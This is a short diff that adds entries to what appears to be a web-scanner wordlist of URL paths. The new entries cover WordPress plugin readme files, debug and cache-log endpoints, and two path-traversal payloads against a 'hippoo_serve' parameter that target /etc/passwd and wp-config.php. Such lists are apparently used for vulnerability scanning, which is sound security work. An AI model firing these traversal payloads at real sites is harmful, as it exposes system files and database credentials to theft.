@@ -2201,3 +2201,13 @@
 /sslmgr
 /speedtest?url={{interactsh-url}}
 /api/v1/retrieval/
+/wp-content/plugins/hippoo/readme.txt
+/wp-content/plugins/everest-forms-pro/readme.txt
+/debug/vars
+/wp-content/plugins/armember-membership/readme.txt
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
+/agents
+/wp-content/cache/log/000000/pagecache.log
+/wp-content/cache/log/000000/minify.log
+/api/agents
